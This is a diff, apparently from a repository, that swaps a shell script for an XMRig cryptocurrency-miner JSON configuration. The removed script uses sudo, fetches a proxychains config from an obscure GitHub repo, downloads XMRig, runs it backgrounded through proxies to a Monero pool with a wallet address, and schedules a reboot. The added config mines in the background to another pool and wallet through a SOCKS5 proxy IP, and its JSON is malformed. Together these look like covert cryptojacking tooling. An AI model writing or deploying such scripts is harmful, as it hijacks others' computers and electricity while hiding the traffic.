@@ -1,12 +1,76 @@
-#!/bin/sh
-sudo -i
-sudo apt-get update
-sudo apt-get install -y proxychains tar
-wget https://raw.githubusercontent.com/gexczxaba/zajbjieyr/main/proxychains12.conf
-mv proxychains12.conf /etc/proxychains.conf
-wget https://github.com/xmrig/xmrig/releases/download/v6.3.4/xmrig-6.3.4-linux-x64.tar.gz
-tar --extract --file xmrig-6.3.4-linux-x64.tar.gz
-cd xmrig-6.3.4
-export PROXY_DNS_SERVER=1.1.1.1
-proxychains ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 48tquhfADzULwBoamh8KiRfT6MmkVuVjQb75qPFk5VmPQsgNsXMcZvzFCfB4qFWWHqCzwgPjwYphsgYcFo3yxrLQ74r7XNP -p x -a cn/r -t 6 -k --tls -B
-sudo shutdown -r +25
+{
+  "api": {
+    "id": null,
+    "worker-id": null
+  },
+  "http": {
+    "enabled": false,
+    "host": "127.0.0.1",
+    "port": 0,
+    "access-token": null,
+    "restricted": true
+  },
+  "autosave": true,
+  "version": 1,
+  "background": true,
+  "colors": false,
+  "randomx": {
+    "init": -1,
+    "numa": true
+  },
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "hw-aes": null,
+    "priority": null,
+    "memory-pool": false,
+    "max-threads-hint": 100,
+    "asm": true,
+    "argon2-impl": null,
+    "cn/0": false,
+    "cn-lite/0": false
+  },
+  "opencl": {
+    "enabled": false,
+    "cache": true,
+    "loader": null,
+    "platform": "AMD",
+    "cn/0": false,
+    "cn-lite/0": false
+  },
+  "cuda": {
+    "enabled": false,
+    "loader": null,
+    "nvml": true,
+    "cn/0": false,
+    "cn-lite/0": false
+  },
+  "donate-level": 1,
+  "donate-over-proxy": 1,
+  "log-file": null,
+  "pools": [
+    {
+      "algo": null,
+      "coin": null,
+      "url": "pool.hashvault.pro:443",
+      "user": "46GciQPkgjkdDPnnS1U2a2SHALspm2T1qXLWjjjKgnvJU9zWvi6CCtKgXHpvTLhPzEMTEaJ4ProbLTgPNsNZ6aPDCA43Kjq",
+      "pass": "x",
+      "rig-id": null,
+      "nicehash": false,
+      "keepalive": false,
+      "enabled": true,
+      "tls": true,
+      "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14",
+      "daemon": false,
+      "self-select": null
+	  "socks5": 72.195.114.184:4145
+    }
+  ],
+  "print-time": 60,
+  "health-print-time": 60,
+  "retries": 5,
+  "retry-pause": 5,
+  "syslog": false,
+  "user-agent": null,
+  "watch": true
+}
